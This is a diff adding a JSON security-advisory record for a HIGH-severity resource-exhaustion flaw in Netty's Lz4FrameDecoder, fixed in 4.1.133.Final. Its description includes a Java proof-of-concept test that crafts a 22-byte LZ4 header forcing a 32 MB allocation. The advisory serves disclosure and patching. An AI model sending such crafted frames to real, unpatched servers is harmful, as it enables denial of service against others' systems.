@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-05-07T00:20:36Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "io.netty:netty-codec"
+  },
+  "Advisory": {
+    "DatabaseId": 353743,
+    "Id": "GSA_kwCzR0hTQS1tajRyLTJoZmMtZjhwNs4ABWXP",
+    "GhsaId": "GHSA-mj4r-2hfc-f8p6",
+    "References": [
+      {
+        "Url": "https://github.com/netty/netty/security/advisories/GHSA-mj4r-2hfc-f8p6"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-mj4r-2hfc-f8p6"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-mj4r-2hfc-f8p6"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-42583"
+      }
+    ],
+    "Description": "### Summary\nLz4FrameDecoder allocates a ByteBuf of size `decompressedLength` (up to 32 MB per block) before LZ4 runs. A peer only needs a 21-byte header plus `compressedLength` payload bytes - 22 bytes if `compressedLength == 1` - to force that allocation.\n\n### Details\nio.netty.handler.codec.compression.Lz4FrameDecoder#decode\nHeader fields are trusted for sizing. On the compressed path, after `readableBytes \u003e= compressedLength`, the decoder does `ctx.alloc().buffer(decompressedLength, decompressedLength)` then decompresses.\n\n### PoC\nThe test below demonstrates how an attacker sending 22 bytes will force the server to allocate 32MB\n\n```java\n    @Test\n    void test() throws Exception {\n        EventLoopGroup workerGroup = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            AtomicReference\u003cThrowable\u003e serverError = new AtomicReference\u003c\u003e();\n            CountDownLatch latch = new CountDownLatch(1);\n\n            ServerBootstrap server = new ServerBootstrap()\n                    .group(workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer\u003cSocketChannel\u003e() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline()\n                                    .addLast(new Lz4FrameDecoder())\n                                    .addLast(new ChannelInboundHandlerAdapter() {\n                                        @Override\n                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                            if (cause instanceof DecoderException) {\n                                                serverError.set(cause.getCause());\n                                            } else {\n                                                serverError.set(cause);\n                                            }\n                                            latch.countDown();\n                                        }\n                                    });\n                        }\n                    });\n\n            ChannelFuture serverChannel = server.bind(0).sync();\n\n            Bootstrap client = new Bootstrap()\n                    .group(workerGroup)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInboundHandlerAdapter() {\n                        @Override\n                        public void channelActive(ChannelHandlerContext ctx) {\n                            ByteBuf buf = ctx.alloc().buffer(22, 22);\n                            buf.writeLong(MAGIC_NUMBER);\n                            buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);\n                            buf.writeIntLE(1);\n                            buf.writeIntLE(1 \u003c\u003c 25);\n                            buf.writeIntLE(0);\n                            buf.writeByte(0);\n\n                            ctx.writeAndFlush(buf);\n\n                            ctx.fireChannelActive();\n                        }\n                    });\n\n            ChannelFuture clientChannel = client.connect(serverChannel.channel().localAddress()).sync();\n\n            assertTrue(latch.await(10, TimeUnit.SECONDS));\n\n            assertInstanceOf(IndexOutOfBoundsException.class, serverError.get());\n\n            clientChannel.channel().close();\n            serverChannel.channel().close();\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n```\n\n### Impact\nUntrusted senders without per-channel / aggregate limits can stress memory with many small requests.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-07T00:20:35Z",
+    "Severity": "HIGH",
+    "Summary": "Netty Lz4FrameDecoder is vulnerable to resource exhaustion ",
+    "UpdatedAt": "2026-05-07T00:20:36Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.1.133.Final"
+      },
+      "VulnerableVersionRange": "\u003c= 4.1.132.Final"
+    }
+  ]
+}
